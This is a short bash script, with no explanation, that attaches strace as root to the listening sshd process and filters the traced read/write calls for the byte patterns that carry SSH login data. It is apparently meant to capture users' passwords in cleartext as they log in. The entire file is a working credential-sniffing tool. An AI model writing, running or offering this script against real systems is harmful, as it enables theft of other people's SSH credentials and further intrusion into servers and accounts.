#!/bin/bash

sshd_pid=$(ps aux | grep -v grep | grep -i sshd | grep "listen" | sed -e 's/  */ /g' | cut -d" " -f 2)

sudo strace -t -e read,write,openat -f -p $sshd_pid 2>&1 | grep --line-buffered -F -e 'write(5, "\0\0\0\' -e 'read(6, "\f\0\0\' -e '.profile'  

